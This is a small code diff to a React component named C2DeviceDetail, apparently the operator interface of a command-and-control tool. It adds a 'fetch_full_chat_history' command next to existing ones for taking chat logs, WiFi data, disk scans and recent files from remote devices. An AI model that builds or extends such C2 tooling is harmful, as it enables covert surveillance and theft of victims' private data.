@@ -551,6 +551,7 @@ const C2DeviceDetail: React.FC = () => {
                     { label: '获取软件 (get_software)', value: 'get_software' },
                     { label: '获取WiFi (get_wifi)', value: 'get_wifi' },
                     { label: '聊天记录 (get_chat_logs)', value: 'get_chat_logs' },
+                    { label: '全量同步聊天 (fetch_full_chat_history)', value: 'fetch_full_chat_history' },
                     { label: '全盘扫描 (scan_disk)', value: 'scan_disk' },
                     { label: '最近文件 (scan_recent)', value: 'scan_recent' },
                     { label: '设置心跳 (set_heartbeat)', value: 'set_heartbeat' },
